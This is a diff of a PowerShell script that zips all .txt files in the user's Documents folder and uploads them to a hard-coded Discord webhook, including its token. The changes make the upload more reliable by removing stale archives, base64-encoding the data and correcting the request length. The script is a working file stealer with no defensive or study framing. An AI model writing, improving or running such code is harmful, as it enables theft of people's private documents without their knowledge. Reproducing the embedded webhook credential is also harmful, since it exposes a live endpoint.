@@ -1,28 +1,41 @@
-# Define the path to the documents folder
+# Path to the documents folder
 $documentsPath = "$env:USERPROFILE\Documents"
-# Define the path to the zip file
+# Path to the zip file
 $zipFilePath = "$documentsPath\txt_files.zip"
 # Discord webhook URL
 $webhookUrl = "https://discord.com/api/webhooks/1243581518152990801/HeVZuyvWfQSYBl1ipXcbIEb2uIScSwlrXj6lazDoujaA741SdO4idCw8nhchRScTwinE"
 
 # Compress all .txt files into a zip file
+if (Test-Path $zipFilePath) {
+    Remove-Item $zipFilePath -Force
+}
 Compress-Archive -Path "$documentsPath\*.txt" -DestinationPath $zipFilePath -Force
 
 # Prepare the file for upload
 $fileBytes = [System.IO.File]::ReadAllBytes($zipFilePath)
 $fileName = [System.IO.Path]::GetFileName($zipFilePath)
-$boundary = [System.Guid]::NewGuid().ToString()
-$body = "--$boundary`r`nContent-Disposition: form-data; name=`"file`"; filename=`"$fileName`"`r`nContent-Type: application/octet-stream`r`n`r`n"
-$body += [System.Text.Encoding]::UTF8.GetString($fileBytes)
-$body += "`r`n--$boundary--`r`n"
 
-# Create a web request to send the file to Discord
+# Create multipart/form-data content
+$boundary = [System.Guid]::NewGuid().ToString()
+$LF = "`r`n"
+$bodyLines = @(
+    "--$boundary",
+    "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"",
+    "Content-Type: application/octet-stream",
+    "",
+    [System.Convert]::ToBase64String($fileBytes),
+    "--$boundary--"
+)
+$body = $bodyLines -join $LF
+$bytes = [System.Text.Encoding]::UTF8.GetBytes($body)
+
+# Send the request
 $webRequest = [System.Net.HttpWebRequest]::Create($webhookUrl)
 $webRequest.Method = "POST"
 $webRequest.ContentType = "multipart/form-data; boundary=$boundary"
-$webRequest.ContentLength = [System.Text.Encoding]::UTF8.GetByteCount($body)
+$webRequest.ContentLength = $bytes.Length
 $webRequestStream = $webRequest.GetRequestStream()
-$webRequestStream.Write([System.Text.Encoding]::UTF8.GetBytes($body), 0, [System.Text.Encoding]::UTF8.GetByteCount($body))
+$webRequestStream.Write($bytes, 0, $bytes.Length)
 $webRequestStream.Close()
 
 # Get the response from the server
